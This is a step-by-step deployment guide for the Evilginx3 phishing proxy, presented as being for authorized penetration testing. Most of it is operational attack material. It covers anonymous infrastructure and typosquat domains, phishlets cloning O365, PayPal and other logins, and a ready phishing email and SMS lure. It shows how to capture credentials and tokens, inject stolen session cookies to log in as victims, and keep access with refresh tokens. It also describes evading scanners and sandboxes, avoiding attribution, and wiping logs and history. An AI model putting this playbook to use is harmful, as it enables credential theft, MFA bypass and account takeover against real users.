# 🚀 Evilginx3 - Complete Deployment Guide
## From VPS Setup to Campaign Deployment

> **⚠️ LEGAL DISCLAIMER**: This guide is for **AUTHORIZED PENETRATION TESTING ONLY**. Unauthorized use is illegal. Always obtain written permission before conducting security assessments.

---

## 📑 Table of Contents

1. [Prerequisites](#1-prerequisites)
2. [VPS Selection & Setup](#2-vps-selection--setup)
3. [Domain Configuration](#3-domain-configuration)
4. [Server Installation](#4-server-installation)
5. [Evilginx3 Installation](#5-evilginx3-installation)
6. [SSL/TLS Certificate Setup](#6-ssltls-certificate-setup)
7. [Phishlet Configuration](#7-phishlet-configuration)
8. [Redirector Setup (Turnstile)](#8-redirector-setup-turnstile)
9. [Lure Creation & Distribution](#9-lure-creation--distribution)
10. [Campaign Monitoring](#10-campaign-monitoring)
11. [Session Harvesting](#11-session-harvesting)
12. [Advanced Evasion Techniques](#12-advanced-evasion-techniques)
13. [Operational Security](#13-operational-security)
14. [Troubleshooting](#14-troubleshooting)
15. [Post-Engagement Cleanup](#15-post-engagement-cleanup)

---

## 1. Prerequisites

### 1.1 Required Resources

**Infrastructure:**
- VPS with minimum 2GB RAM, 2 CPU cores, 20GB storage
- Domain name(s) for phishing
- Cloudflare account (free tier sufficient)
- SSH client (Terminal, PuTTY, etc.)

**Knowledge Requirements:**
- Basic Linux command line
- Understanding of DNS records
- Familiarity with web hosting concepts
- Authorization documentation for red team engagement

### 1.2 Recommended Tools

```bash
# Local machine tools
- SSH client
- Text editor (VS Code, Sublime, etc.)
- Web browser with developer tools
- Email client for testing
```

---

## 2. VPS Selection & Setup

### 2.1 VPS Provider Selection

**Recommended Providers:**

| Provider | Pros | Cons | Starting Price |
|----------|------|------|----------------|
| **DigitalOcean** | Easy setup, good docs | Popular (may be flagged) | $6/month |
| **Vultr** | Good performance, flexible | Limited regions | $6/month |
| **Linode** | Reliable, established | Moderate pricing | $5/month |
| **Hetzner** | Cheap, EU-based | Limited US presence | €4.5/month |
| **AWS Lightsail** | AWS ecosystem | Complex pricing | $5/month |

**Selection Criteria:**
- ✅ Accept cryptocurrency/privacy-focused payment
- ✅ Don't require extensive KYC
- ✅ Allow port 80/443 traffic
- ✅ Good network performance
- ✅ Located near target audience

### 2.2 VPS Creation

**Example: DigitalOcean Setup**

1. **Create Account:**
   ```
   - Sign up at digitalocean.com
   - Verify email
   - Add payment method
   ```

2. **Create Droplet:**
   ```
   Choose an image: Ubuntu 22.04 LTS x64
   Choose a plan: Basic $12/month (2GB RAM, 2 CPUs)
   Choose a datacenter: Closest to targets
   Authentication: SSH keys (recommended) or password
   Hostname: Choose something neutral (e.g., web-server-01)
   ```

3. **Save VPS Details:**
   ```
   IP Address: xxx.xxx.xxx.xxx
   Root password: (if not using SSH keys)
   SSH key: (your private key)
   ```

### 2.3 Initial VPS Access

**Connect via SSH:**

```bash
# If using password
ssh root@YOUR_VPS_IP

# If using SSH key
ssh -i ~/.ssh/id_rsa root@YOUR_VPS_IP
```

**First Login Security Steps:**

```bash
# Update system
sudo apt update && sudo apt upgrade -y

# Create non-root user (optional but recommended)
adduser evilginx
usermod -aG sudo evilginx

# Configure firewall
ufw allow 22/tcp    # SSH
ufw allow 80/tcp    # HTTP
ufw allow 443/tcp   # HTTPS
ufw allow 53/tcp    # DNS
ufw allow 53/udp    # DNS
ufw enable

# Verify firewall status
ufw status
```

### 2.4 SSH Hardening (Optional)

```bash
# Edit SSH config
nano /etc/ssh/sshd_config

# Recommended changes:
Port 2222                        # Change default port
PermitRootLogin no               # Disable root login
PasswordAuthentication no        # Disable password auth (SSH keys only)
PubkeyAuthentication yes         # Enable SSH key auth

# Restart SSH
systemctl restart sshd

# Reconnect using new port
ssh -p 2222 root@YOUR_VPS_IP
```

---

## 3. Domain Configuration

### 3.1 Domain Purchase

**Recommended Domain Registrars:**
- **Namecheap** - Good privacy, accepts crypto
- **Porkbun** - Cheap, privacy-focused
- **Cloudflare Registrar** - At-cost pricing
- **Njalla** - Anonymous registration

**Domain Selection Tips:**

```
✅ Good Domain Choices:
- Similar to legitimate domains (typosquatting)
- Use legitimate TLDs (.com, .net, .org)
- Short and memorable
- Looks professional

❌ Avoid:
- Obvious phishing indicators
- Obscure TLDs (.xyz, .tk, etc.)
- Previously blacklisted domains
- Domains with bad reputation
```

**Examples:**
```
Target: login.microsoft.com
Phishing: login.microsoftonline-verify.com
         login.microsoft-account.net
         secure-microsoft.com
```

### 3.2 Cloudflare Setup

**Why Cloudflare?**
- Free SSL certificates
- CDN and caching
- DDoS protection
- DNS management
- Worker scripts support

**Setup Steps:**

1. **Add Domain to Cloudflare:**
   ```
   1. Sign up at cloudflare.com
   2. Click "Add Site"
   3. Enter your domain
   4. Choose Free plan
   5. Cloudflare scans existing DNS records
   6. Review and continue
   ```

2. **Update Nameservers:**
   ```
   Cloudflare provides 2 nameservers:
   - aiden.ns.cloudflare.com
   - uma.ns.cloudflare.com
   
   Go to your domain registrar:
   1. Find DNS/Nameserver settings
   2. Replace existing nameservers with Cloudflare's
   3. Save changes
   4. Wait 5-60 minutes for propagation
   ```

3. **Verify Nameserver Change:**
   ```bash
   # Check nameservers
   dig NS yourdomain.com +short
   
   # Or use online tools
   https://www.whatsmydns.net/
   ```

### 3.3 DNS Configuration

**Add DNS Records in Cloudflare:**

```
Type  | Name              | Content          | Proxy Status | TTL
------|-------------------|------------------|--------------|-----
A     | @                 | YOUR_VPS_IP      | DNS only     | Auto
A     | login             | YOUR_VPS_IP      | DNS only     | Auto
A     | www               | YOUR_VPS_IP      | DNS only     | Auto
A     | *                 | YOUR_VPS_IP      | DNS only     | Auto
NS    | @                 | ns1.yourdomain   | -            | Auto
NS    | @                 | ns2.yourdomain   | -            | Auto
```

**⚠️ CRITICAL: Set Proxy Status to "DNS only" (gray cloud)**

The gray cloud icon ensures Cloudflare doesn't proxy the traffic, which is necessary for Evilginx to function properly.

**Create Wildcard Certificate (Important):**

```
In Cloudflare SSL/TLS settings:
1. Go to SSL/TLS → Edge Certificates
2. Enable "Always Use HTTPS"
3. Set Minimum TLS Version to 1.2
4. Enable "Automatic HTTPS Rewrites"
```

### 3.4 Verify DNS Propagation

```bash
# Check A record
dig A login.yourdomain.com +short

# Check wildcard
dig A randomsubdomain.yourdomain.com +short

# All should return YOUR_VPS_IP
```

---

## 4. Server Installation

### 4.1 Install Dependencies

**Connect to VPS and run:**

```bash
# Update system
sudo apt update && sudo apt upgrade -y

# Install required packages
sudo apt install -y \
    git \
    build-essential \
    wget \
    curl \
    net-tools \
    dnsutils \
    ufw \
    fail2ban

# Install Go (required for Evilginx)
# Check latest version at: https://go.dev/dl/
wget https://go.dev/dl/go1.22.0.linux-amd64.tar.gz
sudo rm -rf /usr/local/go
sudo tar -C /usr/local -xzf go1.22.0.linux-amd64.tar.gz

# Add Go to PATH
echo 'export PATH=$PATH:/usr/local/go/bin' >> ~/.bashrc
echo 'export GOPATH=$HOME/go' >> ~/.bashrc
source ~/.bashrc

# Verify Go installation
go version
# Should output: go version go1.22.0 linux/amd64
```

### 4.2 Stop Conflicting Services

**Remove/disable services that use port 80/443:**

```bash
# Check what's using ports
sudo netstat -tulpn | grep ':80'
sudo netstat -tulpn | grep ':443'

# Stop and disable Apache (if installed)
sudo systemctl stop apache2
sudo systemctl disable apache2

# Stop and disable Nginx (if installed)
sudo systemctl stop nginx
sudo systemctl disable nginx

# Stop systemd-resolved (it uses port 53)
sudo systemctl stop systemd-resolved
sudo systemctl disable systemd-resolved

# Create custom resolv.conf
sudo rm /etc/resolv.conf
echo "nameserver 8.8.8.8" | sudo tee /etc/resolv.conf
echo "nameserver 8.8.4.4" | sudo tee -a /etc/resolv.conf
sudo chattr +i /etc/resolv.conf  # Make it immutable

# Verify ports are free
sudo netstat -tulpn | grep ':53\|:80\|:443'
# Should return empty
```

---

## 5. Evilginx3 Installation

### 5.1 Clone Repository

```bash
# Create directory
mkdir -p ~/phishing
cd ~/phishing

# Clone Evilginx3
git clone https://github.com/0fukuAkz/Evilginx3.git
cd Evilginx3

# Verify files
ls -la
# Should see: core/, phishlets/, redirectors/, main.go, install.sh, etc.
```

### 5.2 Automated Installation (Recommended)

**Use the provided install script:**

```bash
# Make script executable
chmod +x install.sh

# Run installer
sudo ./install.sh
```

**The script will:**
- ✅ Install all dependencies
- ✅ Build Evilginx from source
- ✅ Configure firewall rules
- ✅ Create systemd service
- ✅ Set up automatic startup
- ✅ Create configuration directories

**Follow the prompts:**
```
Enter your phishing domain: yourdomain.com
Enter server IP: YOUR_VPS_IP
```

### 5.3 Manual Installation (Alternative)

**If you prefer manual installation:**

```bash
# Build Evilginx
cd ~/phishing/Evilginx3
go build -o evilginx main.go

# Verify build
ls -lh evilginx
# Should see ~20MB executable

# Create directories
sudo mkdir -p /root/.evilginx
sudo mkdir -p /root/.evilginx/phishlets
sudo mkdir -p /root/.evilginx/redirectors

# Copy phishlets
sudo cp -r phishlets/* /root/.evilginx/phishlets/
sudo cp -r redirectors/* /root/.evilginx/redirectors/

# Move binary
sudo mv evilginx /usr/local/bin/
sudo chmod +x /usr/local/bin/evilginx
```

### 5.4 Create Systemd Service

**Create service file:**

```bash
sudo nano /etc/systemd/system/evilginx.service
```

**Paste this configuration:**

```ini
[Unit]
Description=Evilginx3 Phishing Framework
After=network.target

[Service]
Type=simple
User=root
WorkingDirectory=/root/.evilginx
ExecStart=/usr/local/bin/evilginx
Restart=on-failure
RestartSec=10s
StandardOutput=journal
StandardError=journal

[Install]
WantedBy=multi-user.target
```

**Enable and start service:**

```bash
# Reload systemd
sudo systemctl daemon-reload

# Enable service
sudo systemctl enable evilginx

# Start service
sudo systemctl start evilginx

# Check status
sudo systemctl status evilginx

# View logs
sudo journalctl -u evilginx -f
```

### 5.5 Verify Installation

**Test Evilginx:**

```bash
# Stop service temporarily
sudo systemctl stop evilginx

# Run manually to test
sudo evilginx

# You should see the Evilginx banner
# Type 'help' to see commands
# Type 'exit' to quit
```

---

## 6. SSL/TLS Certificate Setup

### 6.1 Automatic Certificate Management

Evilginx3 uses **CertMagic** for automatic SSL certificate provisioning via Let's Encrypt.

**Configuration:**

```bash
# Start Evilginx
sudo systemctl stop evilginx
sudo evilginx

# In Evilginx console:
config domain yourdomain.com
config ip YOUR_VPS_IP
```

**Certificates are automatically:**
- Requested from Let's Encrypt
- Installed for all subdomains
- Renewed before expiration
- Stored in `/root/.evilginx/certs/`

### 6.2 Manual Certificate Check

```bash
# Check certificate directory
ls -la /root/.evilginx/certs/

# Verify certificate details
openssl x509 -in /root/.evilginx/certs/yourdomain.com.crt -text -noout

# Test HTTPS
curl -I https://yourdomain.com
```

### 6.3 Troubleshooting Certificates

**If certificates fail to generate:**

```bash
# Ensure ports are open
sudo ufw status
sudo netstat -tulpn | grep ':80\|:443'

# Verify DNS is correct
dig A yourdomain.com +short
# Should return YOUR_VPS_IP

# Check Let's Encrypt rate limits
# https://letsencrypt.org/docs/rate-limits/

# Force certificate renewal in Evilginx
config certificate renew yourdomain.com
```

---

## 7. Phishlet Configuration

### 7.1 Understanding Phishlets

**Available Phishlets:**
- amazon.yaml
- apple.yaml
- booking.yaml
- coinbase.yaml
- facebook.yaml
- instagram.yaml
- linkedin.yaml
- netflix.yaml
- o365.yaml (Microsoft 365)
- okta.yaml
- paypal.yaml
- salesforce.yaml
- spotify.yaml

### 7.2 Configure a Phishlet (Example: O365)

**Start Evilginx:**

```bash
sudo systemctl stop evilginx  # Stop service
sudo evilginx                 # Run interactively
```

**Basic Configuration:**

```bash
# List available phishlets
phishlets

# View phishlet details
phishlets hostname o365

# Set your domain
config domain yourdomain.com
config ip YOUR_VPS_IP

# Enable the phishlet
phishlets hostname o365 yourdomain.com
phishlets enable o365

# Verify status
phishlets
# Should show: o365 | enabled | yourdomain.com
```

### 7.3 Advanced Phishlet Settings

**Configure sub-filters and proxy hosts:**

```bash
# View phishlet configuration
cat /root/.evilginx/phishlets/o365.yaml

# The phishlet automatically handles:
# - login.microsoftonline.com
# - outlook.office365.com
# - login.live.com
# - etc.
```

**Test phishlet:**

```bash
# Create test lure
lures create o365
lures get-url 0

# Example output:
# https://login.yourdomain.com/AbCdEfGh

# Open this URL in browser to test
```

### 7.4 Multiple Phishlets

**You can run multiple phishlets simultaneously:**

```bash
# Enable multiple phishlets with different domains
phishlets hostname linkedin linkedin-verify.com
phishlets enable linkedin

phishlets hostname facebook fb-secure.com
phishlets enable facebook

# Verify all active
phishlets
```

---

## 8. Redirector Setup (Turnstile)

### 8.1 Understanding Redirectors

**Purpose:**
- Add Cloudflare Turnstile CAPTCHA
- Filter bots and automated scanners
- Increase legitimacy
- Pre-qualify targets

**Available Turnstile Redirectors:**
All 13 phishlets have matching turnstile redirectors in `/redirectors/`

### 8.2 Cloudflare Turnstile Setup

**1. Get Turnstile Keys:**

```
1. Go to: https://dash.cloudflare.com/
2. Select your domain
3. Navigate to: Turnstile
4. Create a new site
   - Site name: Your phishing domain
   - Domain: yourdomain.com
   - Widget mode: Managed
5. Copy:
   - Site Key
   - Secret Key
```

**2. Configure Turnstile Redirector:**

```bash
# Navigate to redirector directory
cd ~/phishing/Evilginx3/redirectors/o365_turnstile

# Edit index.html
nano index.html
```

**3. Update Turnstile Configuration:**

Find this section in `index.html`:

```html
<div class="cf-turnstile" 
     data-sitekey="YOUR_TURNSTILE_SITE_KEY"
     data-callback="onTurnstileSuccess">
</div>
```

Replace `YOUR_TURNSTILE_SITE_KEY` with your actual site key.

**4. Update Redirect Target:**

Find this section:

```javascript
function onTurnstileSuccess(token) {
    // Redirect to your phishing lure
    window.location.href = 'https://login.yourdomain.com/LURE_PATH';
}
```

### 8.3 Deploy Redirector

**Option A: Separate Domain (Recommended)**

```bash
# Use a different domain for redirector
# Example:
# - Redirector: microsoft-verify.com
# - Phishing: microsoftonline-secure.com

# Upload to separate hosting:
# - GitHub Pages
# - Netlify
# - Vercel
# - CloudFlare Pages
```

**Option B: Subdomain**

```bash
# Use subdomain on same domain
# - Redirector: verify.yourdomain.com
# - Phishing: login.yourdomain.com

# Configure in Evilginx to serve redirector
# on specific subdomain
```

**Option C: Cloudflare Pages (Recommended)**

```bash
# 1. Create GitHub repo with redirector files
cd ~/phishing/Evilginx3/redirectors/o365_turnstile
git init
git add .
git commit -m "Initial commit"
git remote add origin YOUR_GITHUB_REPO
git push -u origin main

# 2. In Cloudflare:
# - Go to Pages
# - Create a project
# - Connect to GitHub
# - Select your repo
# - Deploy

# 3. Custom domain:
# - Add custom domain: verify.yourdomain.com
# - Cloudflare auto-configures DNS
```

### 8.4 Test Redirector Flow

```
1. User clicks: https://verify.yourdomain.com
2. Cloudflare Turnstile challenge appears
3. User completes CAPTCHA
4. Redirects to: https://login.yourdomain.com/LURE_PATH
5. Evilginx phishing page loads
```

---

## 9. Lure Creation & Distribution

### 9.1 Creating Lures

**In Evilginx console:**

```bash
# Create a lure for o365 phishlet
lures create o365

# Create custom lure with redirect URL
lures create o365

# Edit lure settings
lures edit 0 redirect_url https://office.com
lures edit 0 info "Finance Team Q4 Report"
lures edit 0 paused false

# View all lures
lures

# Get lure URL
lures get-url 0
# Output: https://login.yourdomain.com/AbCdEfGh
```

### 9.2 Lure URL Structure

**Format:**
```
https://[subdomain].[domain]/[random_path]?[optional_parameters]

Example:
https://login.microsoftonline-verify.com/dXNlcmlkPTEyMzQ?rid=user123
```

**Customize path:**

```bash
# You can manually craft URLs
# The path is base64 encoded data

# Evilginx tracks:
# - IP address
# - User agent
# - Timestamp
# - Cookies captured
# - Credentials captured
```

### 9.3 Distribution Methods

**Email Phishing:**

```html
<!-- HTML Email Template Example -->
<!DOCTYPE html>
<html>
<head>
    <style>
        body { font-family: 'Segoe UI', Arial, sans-serif; }
        .button { 
            background: #0078d4; 
            color: white; 
            padding: 12px 24px; 
            text-decoration: none;
            border-radius: 2px;
            display: inline-block;
        }
    </style>
</head>
<body>
    <h2>Action Required: Verify Your Account</h2>
    <p>Dear User,</p>
    <p>We've detected unusual activity on your account. Please verify your identity to prevent account suspension.</p>
    <p><a href="https://verify.yourdomain.com" class="button">Verify Account</a></p>
    <p>This link expires in 24 hours.</p>
    <p>Best regards,<br>IT Security Team</p>
</body>
</html>
```

**SMS/Text:**

```
Microsoft Security Alert: Unusual sign-in detected. 
Verify now: https://verify.yourdomain.com
Expires: 1 hour
```

**QR Code:**

```bash
# Generate QR code for lure URL
# Using online tool or:
sudo apt install qrencode
qrencode -o lure-qr.png "https://verify.yourdomain.com"
```

### 9.4 Social Engineering Tips

**Effective Pretexts:**

```
✅ Good:
- "Password expiration reminder"
- "Security verification required"
- "Document shared with you"
- "Meeting invitation"
- "IT policy update required"

❌ Avoid:
- Obvious urgency threats
- Poor grammar/spelling
- Mismatched branding
- Suspicious domains in plain sight
```

**Timing:**

```
Best times to send:
- Monday morning (8-10 AM)
- Friday afternoon (2-4 PM)
- During known company events
- Tax season for financial pretexts
```

---

## 10. Campaign Monitoring

### 10.1 Real-time Monitoring

**Evilginx Console Commands:**

```bash
# View active sessions
sessions

# View session details
sessions 0

# View captured credentials
sessions 0 creds

# View captured cookies
sessions 0 cookies

# Export session data
sessions export 0 /root/sessions/session-0.json
```

### 10.2 Session Information

**Each session captures:**

```json
{
  "id": "AbCdEfGh",
  "phishlet": "o365",
  "username": "victim@company.com",
  "password": "P@ssw0rd123",
  "timestamp": "2025-11-22T10:30:00Z",
  "ip": "192.168.1.100",
  "user_agent": "Mozilla/5.0...",
  "cookies": {
    "ESTSAUTH": "...",
    "ESTSAUTHPERSISTENT": "..."
  },
  "tokens": {
    "access_token": "...",
    "refresh_token": "..."
  }
}
```

### 10.3 Telegram Integration

**Setup Telegram Notifications:**

```bash
# Create Telegram Bot:
# 1. Message @BotFather on Telegram
# 2. Send: /newbot
# 3. Name your bot
# 4. Copy Bot Token

# Get your Chat ID:
# 1. Message @userinfobot
# 2. Copy your ID

# Configure in Evilginx:
telegram setup

# Enter:
# - Bot Token: 123456:ABC-DEF...
# - Chat ID: 987654321

# Test notification
telegram test

# Enable auto-notifications
telegram enable
```

**You'll receive notifications for:**
- New sessions created
- Credentials captured
- Cookies harvested
- Errors/warnings

### 10.4 Log Files

```bash
# View Evilginx logs
sudo journalctl -u evilginx -f

# View access logs
tail -f /root/.evilginx/logs/access.log

# View error logs
tail -f /root/.evilginx/logs/error.log

# Export logs for analysis
cp /root/.evilginx/logs/*.log /root/campaign-logs/
```

---

## 11. Session Harvesting

### 11.1 Understanding Captured Data

**Evilginx captures:**

1. **Credentials** - Username/password pairs
2. **Session Cookies** - Authentication cookies
3. **Tokens** - OAuth, JWT, refresh tokens
4. **User Info** - IP, User-Agent, browser fingerprint
5. **Request Data** - POST parameters, headers

### 11.2 Extracting Sessions

**Export Individual Session:**

```bash
# In Evilginx console
sessions export 0 /root/harvest/session-0.json

# View on filesystem
cat /root/harvest/session-0.json | jq .
```

**Export All Sessions:**

```bash
# Create export directory
mkdir -p /root/harvest

# Export all
sessions export-all /root/harvest/

# List exported files
ls -lh /root/harvest/
```

### 11.3 Session Cookie Injection

**Using captured cookies to access accounts:**

**Method 1: Browser Extension (EditThisCookie)**

```
1. Install "EditThisCookie" browser extension
2. Navigate to legitimate site (e.g., office.com)
3. Open EditThisCookie
4. Delete all existing cookies
5. Import cookies from Evilginx session
6. Refresh page
7. You should be logged in as victim
```

**Method 2: Browser Developer Tools**

```javascript
// Open browser console (F12)
// Paste captured cookies:

document.cookie = "ESTSAUTH=VALUE_FROM_EVILGINX; domain=.login.microsoftonline.com; path=/";
document.cookie = "ESTSAUTHPERSISTENT=VALUE; domain=.login.microsoftonline.com; path=/";

// Refresh page
location.reload();
```

**Method 3: Python Script**

```python
import requests

# Load captured cookies
cookies = {
    'ESTSAUTH': 'captured_value_here',
    'ESTSAUTHPERSISTENT': 'captured_value_here',
    # ... more cookies
}

# Make authenticated request
response = requests.get(
    'https://outlook.office365.com/api/v2.0/me/messages',
    cookies=cookies
)

print(response.json())
```

### 11.4 Token Usage

**OAuth/JWT Tokens:**

```bash
# Captured access token example
ACCESS_TOKEN="eyJ0eXAiOiJKV1QiLCJhbGc..."

# Use in API request
curl -H "Authorization: Bearer $ACCESS_TOKEN" \
     https://graph.microsoft.com/v1.0/me

# Use in application
# Import token into:
# - Microsoft Graph API calls
# - Email clients
# - Custom applications
```

### 11.5 Persistence

**Long-term Access:**

```bash
# Refresh tokens provide persistent access
# They can be used to generate new access tokens
# Even after victim changes password (in some cases)

# Store refresh tokens securely
# Use them to maintain access during engagement
```

---

## 12. Advanced Evasion Techniques

### 12.1 ML Bot Detection

**Enable Machine Learning Detection:**

```bash
# In Evilginx console
ml-detector enable

# Configure sensitivity (0-100)
ml-detector sensitivity 75

# Whitelist known good IPs
ml-detector whitelist-ip 192.168.1.100

# View blocked attempts
ml-detector stats
```

**Features:**
- Behavioral analysis
- Mouse movement tracking
- Keystroke dynamics
- Scroll pattern analysis
- Browser fingerprinting

### 12.2 JA3 Fingerprinting

**Block automated tools:**

```bash
# Enable JA3 fingerprinting
ja3 enable

# Block specific JA3 hashes
ja3 blacklist add "e7d705a3286e19ea42f587b344ee6865"

# Whitelist legitimate browsers
ja3 whitelist add "51c64c77e60f3980eea90869b68c58a8"

# View statistics
ja3 stats
```

**Common JA3 hashes to block:**
```
# curl
05bc82ac9e4e918db0d0a6842dbdf6dd

# python-requests
9dc1e1fa4e2dd2e92eedb7a2b8e9e799

# Go http client
623de93db17d313345d7ea481e7443cf
```

### 12.3 Sandbox Detection

**Detect analysis environments:**

```bash
# Enable sandbox detection
sandbox-detector enable

# Configure detection methods
sandbox-detector check-vm true
sandbox-detector check-debugger true
sandbox-detector check-analysis-tools true

# Action on detection
sandbox-detector action block  # or redirect, log
```

**Detected environments:**
- VirtualBox, VMware, QEMU
- Debuggers (gdb, windbg)
- Analysis tools (Wireshark, Fiddler)
- Sandbox services (Joe Sandbox, Any.run)

### 12.4 Polymorphic Engine

**Randomize page content:**

```bash
# Enable polymorphic engine
polymorphic enable

# Set mutation rate (1-100)
polymorphic mutation-rate 50

# Configure mutation types
polymorphic mutate-html true
polymorphic mutate-js true
polymorphic mutate-css true

# Each visitor sees slightly different page
# Defeats signature-based detection
```

### 12.5 Blacklisting/Whitelisting

**IP-based filtering:**

```bash
# Blacklist known security companies
blacklist add 8.8.8.8
blacklist add-range 1.2.3.0/24

# Whitelist target organization
whitelist add 10.0.0.0/8
whitelist add 192.168.1.100

# Configure action for non-whitelisted
whitelist-mode enforce  # Block all non-whitelisted
```

**User-Agent filtering:**

```bash
# Block security scanners
blacklist user-agent "security-scanner"
blacklist user-agent "Nmap Scripting Engine"
blacklist user-agent "curl"
blacklist user-agent "python-requests"
```

### 12.6 Geo-fencing

**Limit by geographic location:**

```bash
# Allow only specific countries
geo allow US,UK,CA

# Block specific countries
geo block CN,RU,KP

# Redirect blocked regions
geo redirect-url https://legitimate-site.com
```

### 12.7 Traffic Shaping

**Rate limiting:**

```bash
# Enable traffic shaping
traffic-shaper enable

# Set rate limits
traffic-shaper max-requests-per-ip 100
traffic-shaper time-window 3600  # 1 hour

# Configure burst limits
traffic-shaper burst-size 10
```

---

## 13. Operational Security

### 13.1 Infrastructure OPSEC

**VPS Security:**

```bash
# Use VPN/proxy to access VPS
# Never connect directly from personal IP

# Rotate VPS regularly
# Don't reuse infrastructure

# Use separate payment methods
# Cryptocurrency preferred

# Use burner email addresses
```

**Domain Security:**

```bash
# Enable WHOIS privacy
# Use domain privacy services

# Rotate domains frequently
# Register in advance

# Use separate registrar accounts
# Don't link to personal identity
```

### 13.2 Communication Security

**Secure channels:**

```bash
# Use encrypted communication
# Signal, Telegram, Wickr

# Never discuss operations on:
# - Email
# - SMS
# - Unencrypted chat

# Use code words/phrases
# Don't mention tools by name
```

### 13.3 Data Handling

**Captured data security:**

```bash
# Encrypt stored sessions
# Use GPG or similar

# Example: Encrypt session export
gpg -c session-0.json
# Creates: session-0.json.gpg

# Decrypt when needed
gpg -d session-0.json.gpg > session-0.json

# Secure deletion
shred -vfz -n 10 session-0.json
```

**Data retention policy:**

```
1. Export necessary data immediately
2. Encrypt exports
3. Delete from server within 24 hours
4. Store encrypted backups offline
5. Delete after engagement completion
```

### 13.4 Logging Discipline

**Minimize logs:**

```bash
# Disable verbose logging
config log-level error

# Disable access logs (careful!)
config access-log false

# Clear logs regularly
truncate -s 0 /root/.evilginx/logs/*.log

# Or disable systemd logging
# Edit: /etc/systemd/system/evilginx.service
StandardOutput=null
StandardError=null
```

### 13.5 Attribution Prevention

**Avoid attribution:**

```
✅ Do:
- Use unique phishlets for each engagement
- Customize templates
- Change default configurations
- Randomize naming conventions
- Use different hosting per campaign

❌ Don't:
- Reuse infrastructure
- Use default configurations
- Leave metadata in files
- Connect from personal networks
- Discuss operations publicly
```

---

## 14. Troubleshooting

### 14.1 Common Issues

**Issue: Evilginx won't start**

```bash
# Check port conflicts
sudo netstat -tulpn | grep ':53\|:80\|:443'

# Kill conflicting processes
sudo kill -9 PID

# Check logs
sudo journalctl -u evilginx -n 50

# Run manually to see errors
sudo evilginx
```

**Issue: DNS not resolving**

```bash
# Check DNS configuration
dig @YOUR_VPS_IP yourdomain.com

# Verify nameserver
dig NS yourdomain.com +short

# Check if Evilginx DNS is running
sudo netstat -tulpn | grep ':53'

# Restart Evilginx
sudo systemctl restart evilginx
```

**Issue: SSL certificates not generating**

```bash
# Verify DNS points to VPS
dig A yourdomain.com +short

# Check firewall
sudo ufw status

# Allow HTTP for ACME challenge
sudo ufw allow 80/tcp

# Check Let's Encrypt rate limits
# Wait 1 hour and retry

# Force renewal
# In Evilginx console:
config certificate renew yourdomain.com
```

**Issue: Phishing page not loading**

```bash
# Check phishlet is enabled
phishlets

# Verify hostname is set
phishlets hostname o365

# Test with curl
curl -I https://login.yourdomain.com

# Check proxy_hosts in phishlet
cat /root/.evilginx/phishlets/o365.yaml
```

**Issue: Cookies not captured**

```bash
# Verify session tracking
sessions

# Check phishlet auth_tokens section
# Must have correct cookie names

# Test manually:
# 1. Open phishing page
# 2. Complete login flow
# 3. Check Evilginx console: sessions
```

### 14.2 Debugging

**Enable debug mode:**

```bash
# In Evilginx console
config log-level debug

# View detailed logs
sudo journalctl -u evilginx -f

# Look for errors in:
# - Certificate generation
# - Phishlet loading
# - Session tracking
# - Cookie capture
```

**Network debugging:**

```bash
# Capture traffic with tcpdump
sudo tcpdump -i eth0 -w capture.pcap port 80 or port 443

# Analyze with Wireshark
wireshark capture.pcap

# Check HTTP responses
curl -v https://login.yourdomain.com
```

### 14.3 Performance Issues

**Optimize Evilginx:**

```bash
# Limit concurrent connections
# Edit: /etc/systemd/system/evilginx.service
# Add:
LimitNOFILE=65536

# Reload and restart
sudo systemctl daemon-reload
sudo systemctl restart evilginx

# Monitor resource usage
htop

# Check disk usage
df -h
```

**VPS upgrades:**

```
If experiencing issues:
- Upgrade to 4GB RAM
- Add more CPU cores
- Enable swap space
```

---

## 15. Post-Engagement Cleanup

### 15.1 Data Extraction

**Before cleanup, export everything:**

```bash
# Create backup directory
mkdir -p /root/engagement-backup

# Export all sessions
sessions export-all /root/engagement-backup/

# Copy logs
cp -r /root/.evilginx/logs /root/engagement-backup/

# Copy configuration
cp -r /root/.evilginx/config /root/engagement-backup/

# Create encrypted archive
tar -czf engagement-backup.tar.gz /root/engagement-backup/
gpg -c engagement-backup.tar.gz

# Download to local machine
# From local machine:
scp root@YOUR_VPS_IP:/root/engagement-backup.tar.gz.gpg ./

# Verify download
ls -lh engagement-backup.tar.gz.gpg
```

### 15.2 Server Cleanup

**Thorough cleanup:**

```bash
# Stop Evilginx
sudo systemctl stop evilginx
sudo systemctl disable evilginx

# Remove service
sudo rm /etc/systemd/system/evilginx.service
sudo systemctl daemon-reload

# Delete Evilginx files
sudo rm -rf /usr/local/bin/evilginx
sudo rm -rf /root/.evilginx
sudo rm -rf ~/phishing

# Remove Go installation (optional)
sudo rm -rf /usr/local/go
sudo rm -rf ~/go

# Clear logs
sudo truncate -s 0 /var/log/syslog
sudo truncate -s 0 /var/log/auth.log
sudo journalctl --vacuum-time=1s

# Clear bash history
history -c
cat /dev/null > ~/.bash_history

# Clear command history
rm ~/.bash_history
ln -s /dev/null ~/.bash_history
```

### 15.3 Infrastructure Teardown

**VPS destruction:**

```bash
# From VPS provider dashboard:
# 1. Take snapshot (if needed for future reference)
# 2. Destroy/delete droplet
# 3. Delete snapshots after secure backup
# 4. Remove SSH keys
# 5. Delete firewall rules
```

**Domain cleanup:**

```
1. Remove all DNS records
2. Delete domain (or let expire)
3. Remove from Cloudflare
4. Delete Cloudflare account (if single-use)
5. Delete Turnstile configurations
```

**Redirector cleanup:**

```
1. Delete Cloudflare Pages deployment
2. Delete GitHub repository
3. Remove custom domains
4. Delete Cloudflare Workers (if used)
```

### 15.4 Evidence Preservation

**For authorized engagements:**

```bash
# Preserve evidence per SOW requirements:

1. Session captures (encrypted)
2. Timestamped logs
3. Screenshot evidence
4. Email headers/metadata
5. Configuration backups

# Store securely:
# - Encrypted storage
# - Access-controlled
# - Retention policy compliant
# - Client-deliverable format
```

### 15.5 Reporting

**Generate engagement report:**

```markdown
# Phishing Engagement Report

## Executive Summary
- Campaign dates: [START] - [END]
- Targets: [NUMBER]
- Success rate: [PERCENTAGE]
- Credentials captured: [NUMBER]
- Sessions harvested: [NUMBER]

## Campaign Details
- Phishlet: [TYPE]
- Domain: [DOMAIN]
- Lure distribution: [METHOD]
- Redirector: [URL]

## Technical Details
- Infrastructure: [VPS/HOSTING]
- Evasion techniques: [LIST]
- Detection rate: [PERCENTAGE]

## Captured Data
- Usernames: [LIST]
- Session cookies: [COUNT]
- 2FA bypass: [SUCCESS/FAIL]

## Recommendations
- [SECURITY IMPROVEMENTS]
